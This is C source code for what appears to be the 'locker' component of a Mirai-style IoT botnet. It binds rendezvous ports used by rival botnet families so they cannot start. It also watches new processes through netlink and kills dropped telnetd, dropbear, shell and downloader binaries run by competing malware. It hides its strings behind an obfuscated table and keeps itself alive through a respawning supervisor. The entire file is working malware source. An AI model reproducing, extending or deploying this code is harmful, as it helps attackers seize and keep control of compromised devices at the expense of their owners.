
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <poll.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/netlink.h>

#include "includes.h"
#include "locker.h"
#include "killer.h"
#include "table.h"
#include "util.h"

/* Netlink sizing: cn_proc can batch many events in one recv() burst — a
 * one-message buffer will truncate under fork storms. 16 KB is safe for the
 * default kernel batch. */
#define SEND_MESSAGE_LEN (NLMSG_LENGTH(sizeof(struct cn_msg) + sizeof(enum proc_cn_mcast_op)))
#define BUFF_SIZE (16 * 1024)

static int locker_pid = -1;
static char locker_own_path[PATH_MAX];
static int  locker_own_len = 0;

struct locked_port { int fd; uint16_t port; };
#define MAX_LOCKED_PORTS 16
static struct locked_port locked_ports[MAX_LOCKED_PORTS];
static int locked_port_count = 0;

/* ---------------- port locking ---------------- */

static int locker_hold_port(uint16_t port)
{
    struct sockaddr_in addr;
    int fd, opt = 1;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) return -1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(int));
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) { close(fd); return -1; }
    listen(fd, 1);
    return fd;
}

static void locker_bind_ports(void)
{
    /* 23 and 2323 are held by killer (IPv4 + IPv6) — don't waste a second
     * bind() that will EADDRINUSE. Locker owns the family-specific ports:
     *   55555, 1338, 1991  — Mirai single-instance / older Gafgyt rendezvous
     *   4141, 40           — Hakai / Katana lock ports
     *   6771               — Torii C2 rendezvous
     *   1337               — generic script-kiddie default
     *   48101              — Aidra / Cetus single-instance
     *   45845              — Mozi
     *   9999               — Tsunami/Kaiten rendezvous */
    uint16_t ports[] = {55555, 1338, 1991, 4141, 40, 6771, 1337, 48101, 45845, 9999};
    int i, fd;
    for (i = 0; i < (int)(sizeof(ports) / sizeof(ports[0])); i++) {
        fd = locker_hold_port(ports[i]);
        if (fd != -1 && locked_port_count < MAX_LOCKED_PORTS) {
            locked_ports[locked_port_count].fd = fd;
            locked_ports[locked_port_count].port = ports[i];
            locked_port_count++;
        } else if (fd != -1) close(fd);
    }
}

static void locker_close_ports(void)
{
    int i;
    for (i = 0; i < locked_port_count; i++)
        if (locked_ports[i].fd != -1) { close(locked_ports[i].fd); locked_ports[i].fd = -1; }
    locked_port_count = 0;
}

/* ---------------- path helpers ---------------- */

static const char *path_basename(const char *path)
{
    const char *p = path, *b = path;
    while (*p) { if (*p == '/') b = p + 1; p++; }
    return b;
}

/* True if the exe path lives in a normal system daemon directory. Used to
 * guard the telnetd/dropbear cmdline kill: distro daemons legitimately live
 * here and must not be swept; only DROPPED copies (in /tmp, /dev/shm, /var,
 * etc.) get killed. */
static BOOL is_system_daemon_path(const char *path, int len)
{
    return util_stristr(path, len, "/usr/sbin/")  != -1 ||
           util_stristr(path, len, "/usr/bin/")   != -1 ||
           util_stristr(path, len, "/usr/local/") != -1 ||
           util_stristr(path, len, "/sbin/")      != -1 ||
           util_stristr(path, len, "/bin/")       != -1 ||
           util_stristr(path, len, "/lib/")       != -1;
}

/* Single source of truth: is `name` an exact basename match against one of
 * the daemon names droppers commonly install as their own C2 vector?
 * Used by BOTH the netlink spawn handler AND the fallback cmdline scan so
 * the policy is consistent (previous code used substring in one path and
 * exact match in the other — fixed here). */
static BOOL is_dropped_daemon_name(const char *name)
{
    /* Table-backed strings we already have obfuscated */
    static const uint8_t ids[] = {
        TABLE_STR_TELNETD, TABLE_STR_DROPBEAR,
    };
    /* Additional inline names — these are common competitor drops but weren't
     * worth their own table slot. Match is exact-basename. */
    static const char *extra[] = {
        "sshd",       /* fake sshd dropped in /tmp for backdoor persistence */
        "busybox",    /* renamed busybox shell used as C2 stager */
        "bash",       /* dropped bash shell binary (competitor stager) */
        "sh",         /* dropped sh binary */
        "wget", "tftp", "curl",   /* live download+exec stagers */
    };
    unsigned i;
    for (i = 0; i < sizeof(ids)/sizeof(ids[0]); i++) {
        table_unlock_val(ids[i]);
        BOOL hit = util_strcmp(name, table_retrieve_val(ids[i], NULL));
        table_lock_val(ids[i]);
        if (hit) return TRUE;
    }
    for (i = 0; i < sizeof(extra)/sizeof(extra[0]); i++)
        if (util_strcmp(name, extra[i])) return TRUE;
    return FALSE;
}

/* Extract argv[0] basename from a NUL-separated cmdline buffer.
 * argv[0] often contains a path (/tmp/telnetd) and matcher wants just
 * "telnetd". Returns pointer within buf; buf may be truncated in place. */
static const char *cmdline_basename(char *buf, int n)
{
    int i;
    /* Truncate at first NUL — that's the end of argv[0]. */
    for (i = 0; i < n; i++) if (buf[i] == 0) { n = i; break; }
    buf[n] = 0;
    /* Basename */
    return path_basename(buf);
}

/* Read /proc/PID/exe into rpath (NUL-terminated). Returns length or -1. */
static int read_exe_link(int pid, char *rpath, int cap)
{
    char exe_path[PATH_MAX], pid_s[16], *ptr;
    int rl;
    util_itoa(pid, 10, pid_s);
    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr = exe_path;
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, pid_s);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    rl = readlink(exe_path, rpath, cap - 1);
    if (rl <= 0) return -1;
    rpath[rl] = 0;
    return rl;
}

/* ---------------- narrow secondary hunt ----------------
 * killer_scan_once() covers malware/families/deleted/memfd/LD_PRELOAD.
 * This function handles ONLY what killer doesn't: a telnetd/dropbear dropped
 * outside a system directory (competitor establishing its own C2 vector). */
static void hunt_dropped_daemons(void)
{
    DIR *dir;
    struct dirent *file;
    char rpath[PATH_MAX];

    table_unlock_val(TABLE_KILLER_PROC);
    dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    if (!dir) return;

    while ((file = readdir(dir)) != NULL) {
        int pid, rl;
        char cmdline_path[PATH_MAX], cmdline[1024], *ptr, pid_s[16];
        int fd, n;

        if (file->d_name[0] < '1' || file->d_name[0] > '9') continue;
        pid = atoi(file->d_name);
        if (pid <= LOCKER_MIN_PID || pid == 1 || pid == getpid() || pid == getppid())
            continue;

        rl = read_exe_link(pid, rpath, sizeof(rpath));
        if (rl <= 0) continue;

        /* Skip us, and any binary living in the standard system tree —
         * distro telnetd/dropbear/sshd are legitimate. */
        if (util_strcmp(rpath, locker_own_path)) continue;
        if (is_system_daemon_path(rpath, rl)) continue;

        /* Only dropped copies reach here. Scan cmdline for the daemon name. */
        util_itoa(pid, 10, pid_s);
        ptr = cmdline_path;
        table_unlock_val(TABLE_KILLER_PROC);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        table_lock_val(TABLE_KILLER_PROC);
        ptr += util_strcpy(ptr, pid_s);
        table_unlock_val(TABLE_PATH_CMD_LINE);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_PATH_CMD_LINE, NULL));
        table_lock_val(TABLE_PATH_CMD_LINE);

        fd = open(cmdline_path, O_RDONLY);
        if (fd < 0) continue;
        n = read(fd, cmdline, sizeof(cmdline) - 1);
        close(fd);
        if (n <= 0) continue;

        /* Exact basename match against argv[0] — same policy as netlink. */
        const char *base = cmdline_basename(cmdline, n);
        if (!is_dropped_daemon_name(base)) continue;

        /* Cooldown via killer's shared ring — respawning misclassified
         * daemons don't get hammered every 2s. */
        if (killer_kill_cooldown(rpath, rl)) continue;
        kill(pid, SIGKILL);
    }
    closedir(dir);
}

/* ---------------- netlink cn_proc realtime monitor ---------------- */

/* Match a spawn event's exe against the dropped-daemon rule. Same policy as
 * hunt_dropped_daemons but on a single PID (no /proc walk). */
static void netlink_handle_spawn(int new_pid)
{
    char rpath[PATH_MAX];
    int rl;
    const char *base;

    if (new_pid <= LOCKER_MIN_PID || new_pid == 1 ||
        new_pid == getpid() || new_pid == getppid()) return;

    rl = read_exe_link(new_pid, rpath, sizeof(rpath));
    if (rl <= 0) return;

    if (util_strcmp(rpath, locker_own_path)) return;
    if (is_system_daemon_path(rpath, rl)) return;  /* MUST guard: system daemons legit */

    base = path_basename(rpath);

    /* Same exact-basename policy as the fallback scanner — no more
     * substring/exact-match split between the two paths. */
    if (!is_dropped_daemon_name(base)) return;
    if (killer_kill_cooldown(rpath, rl)) return;
    kill(new_pid, SIGKILL);
}

static void locker_netlink_monitor(void)
{
    int nlfd;
    struct sockaddr_nl sa;
    /* Stack-allocated 16KB — reentrant. Netlink monitor never runs
     * concurrently with itself today (single supervisor → single worker),
     * but keeping locals off .bss removes the latent footgun. */
    char buff[BUFF_SIZE];
    struct nlmsghdr *nlh;
    struct cn_msg *cn_msg;
    struct proc_event *ev;

    nlfd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
    if (nlfd == -1) goto fallback;

    sa.nl_family = AF_NETLINK;
    sa.nl_groups = CN_IDX_PROC;
    sa.nl_pid = getpid();
    if (bind(nlfd, (struct sockaddr *)&sa, sizeof(sa)) == -1) { close(nlfd); goto fallback; }

    nlh = (struct nlmsghdr *)buff;
    nlh->nlmsg_len = SEND_MESSAGE_LEN;
    nlh->nlmsg_type = NLMSG_DONE;
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = getpid();
    cn_msg = (struct cn_msg *)NLMSG_DATA(nlh);
    cn_msg->id.idx = CN_IDX_PROC;
    cn_msg->id.val = CN_VAL_PROC;
    cn_msg->seq = 0;
    cn_msg->ack = 0;
    cn_msg->len = sizeof(enum proc_cn_mcast_op);
    *((enum proc_cn_mcast_op *)cn_msg->data) = PROC_CN_MCAST_LISTEN;
    if (send(nlfd, nlh, nlh->nlmsg_len, 0) == -1) { close(nlfd); goto fallback; }

    while (1) {
        struct pollfd pfd = { .fd = nlfd, .events = POLLIN };
        int n = poll(&pfd, 1, 30000);
        if (n < 0) continue;
        if (n == 0) {
            /* No spawn traffic for 30s — cheap safety-net sweep in case we
             * missed something (kernel dropped events under pressure). */
            killer_scan_once();
            hunt_dropped_daemons();
            continue;
        }

        n = recv(nlfd, buff, sizeof(buff), MSG_DONTWAIT);
        if (n <= 0) continue;

        nlh = (struct nlmsghdr *)buff;
        while (NLMSG_OK(nlh, n)) {
            /* Validate: reject error/noise messages before casting payload. */
            if (nlh->nlmsg_type == NLMSG_ERROR || nlh->nlmsg_type == NLMSG_NOOP)
                goto next;
            if (nlh->nlmsg_type != NLMSG_DONE)
                goto next;

            cn_msg = (struct cn_msg *)NLMSG_DATA(nlh);
            if (cn_msg->id.idx != CN_IDX_PROC || cn_msg->id.val != CN_VAL_PROC)
                goto next;

            ev = (struct proc_event *)cn_msg->data;
            if (ev->what == PROC_EVENT_FORK)
                netlink_handle_spawn(ev->event_data.fork.child_tgid);
            else if (ev->what == PROC_EVENT_EXEC)
                netlink_handle_spawn(ev->event_data.exec.process_tgid);

next:
            nlh = NLMSG_NEXT(nlh, n);
        }
    }

fallback:
    /* No cn_proc (unprivileged, hardened, or send failed): tight poll. */
    while (1) {
        killer_scan_once();
        hunt_dropped_daemons();
        sleep(2);
    }
}

/* ---------------- supervisor ----------------
 * Bot forks locker_pid. locker_pid forks a single worker (netlink monitor).
 * Supervisor waitpid()s the worker and re-forks it if it dies — no partial
 * redundancy with a separate poll loop, no orphan risk if the middle process
 * survives. Bot process is direct parent of the supervisor; PR_SET_PDEATHSIG
 * on the worker fires if the supervisor dies. */
static void supervisor_loop(void)
{
    while (1) {
        pid_t w = fork();
        if (w == -1) { sleep(5); continue; }
        if (w == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            locker_bind_ports();
            locker_netlink_monitor();
            _exit(0);
        }
        /* Wait for the worker; if it dies, respawn after a small delay. */
        int st;
        waitpid(w, &st, 0);
        sleep(1);
    }
}

void locker_init(void)
{
    /* Capture own exe path before fork so the child inherits it. */
    table_unlock_val(TABLE_PATH_PROC_SELF_EXE);
    locker_own_len = readlink(table_retrieve_val(TABLE_PATH_PROC_SELF_EXE, NULL),
                              locker_own_path, sizeof(locker_own_path) - 1);
    table_lock_val(TABLE_PATH_PROC_SELF_EXE);
    if (locker_own_len > 0) locker_own_path[locker_own_len] = 0;
    else                    locker_own_path[0] = 0;

    locker_pid = fork();
    if (locker_pid > 0 || locker_pid == -1) return;

    /* Close inherited fd_ctrl so it doesn't block single-instance restart. */
    extern int fd_ctrl;
    if (fd_ctrl != -1) { close(fd_ctrl); fd_ctrl = -1; }

    /* Prime killer's scan cache in this process before delegating. */
    killer_prepare_scan();

    supervisor_loop();
    _exit(0);
}

void locker_kill(void)
{
    if (locker_pid > 0) { kill(locker_pid, SIGKILL); locker_pid = -1; }
    locker_close_ports();
}
